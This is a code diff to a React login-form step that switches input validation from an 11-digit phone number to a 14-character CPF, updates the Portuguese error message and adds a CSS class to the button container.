@@ -33,14 +33,14 @@ const Step1 = ({ nextStep, loginData, setLoginData }) => {
   
 
     const onClick = () => {
-        if (loginData.usuario.length === 11) {
+        if (loginData.usuario.length === 14) {
             setLoading(true)
             setTimeout(() =>{
                 nextStep()
             },2000)
             
-        } else if (loginData.usuario.length < 11) {
-            alertify.alert('Aviso', 'Número Incorreto')
+        } else if (loginData.usuario.length < 14) {
+            alertify.alert('Aviso', 'CPF Incorreto')
         }
         //   console.log(loginData.telefone.length)
 
@@ -76,7 +76,7 @@ const Step1 = ({ nextStep, loginData, setLoginData }) => {
 
          
 
-            <div>
+            <div className="botaoestilo">
                 <button type="button" className="botaoLaranja" onClick={onClick}>Continuar</button>
             </div>
 
